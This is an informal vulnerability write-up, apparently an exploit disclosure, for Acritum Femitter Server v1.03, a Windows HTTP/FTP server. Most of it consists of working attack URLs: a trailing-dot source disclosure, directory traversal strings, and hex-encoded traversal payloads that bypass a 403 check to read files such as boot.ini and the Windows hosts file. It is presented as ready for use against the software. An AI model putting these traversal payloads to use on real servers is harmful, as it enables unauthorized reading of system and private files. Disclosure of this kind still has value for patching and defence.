--=> Tested on: XP sp 2


Acritum Femitter Server v1.03 is a HTTP and  FTP Server for Windows.
I came up with few vulnerabilities of this .. some vulns are already has been revelied but some are not
so lets have a look


*********************************************************************************************************************************
HTTP Server
-----------

In the Femitter Server Application HTTP tab there are few options to choose, and vulnerability exploitation method will depends on it

If the "Combined Server" is selected [Default Setting]
----------------------------------------------------
--== Source Disclosure Vulnerability==--
even some files like .html will able to download from this vulnerability
just put "." in the end of the file

[+] http://192.168.1.101/index.htm.


--==Directory Traversal Vulnerability==--
If the Femitter Server is installed in "Programe File" this will take you to the C Dir

C: Dir
------
[+] http://192.168.1.101/..\../..\

You can move in to dir by doing "../..\"

but you won't be able to open the files there will be 403 Forbidden Error(still). this is a lame security option in the Femitter Server



*********************************************************************************************************************************

Bypassing 403 Forbidden Error
-----------------------------
This is lame a security option . This can be easily bypass with hex . lets see how its done
This c0de will give you permission to download anyfile
[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini

but if you wana open it in the browser you can add a "%<file.type> in the end
--==403 Bypass Example==--

[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini%test.txt
[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts%test.txt

********************************************************************************************************************************

If the "Web Server (to show default doctument or 404 if it doesn't exsist" option is selected
---------------------------------------------------------------------------------------------

If this option is activated you might have trouble viewing the directory
but still you will be able to see the file and download them


[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini%test.txt

and also this will open it as a readable file on the browser

[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini% ../


pluse you can use the above application to view unreadable files like .dll .exe .
files like .dll .exe will not be open with %text.txt .. this doesnt make sense right
eventho .dll .exe is not readable this vulnerability can be quite usefull sometime ..
